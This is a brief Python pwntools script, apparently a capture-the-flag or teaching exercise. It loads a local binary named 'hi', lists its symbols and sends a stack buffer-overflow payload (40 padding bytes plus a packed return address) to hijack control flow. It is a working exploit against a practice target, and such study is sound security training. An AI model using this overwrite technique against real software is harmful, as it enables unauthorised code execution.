from pwn import *

elf = ELF("./hi")

print("This binary has many symbols:")
print(elf.symbols)

with process("./hi") as r:
    inp=b'A'*40+p64(0x400637) #Notare il p64
    r.sendline(inp)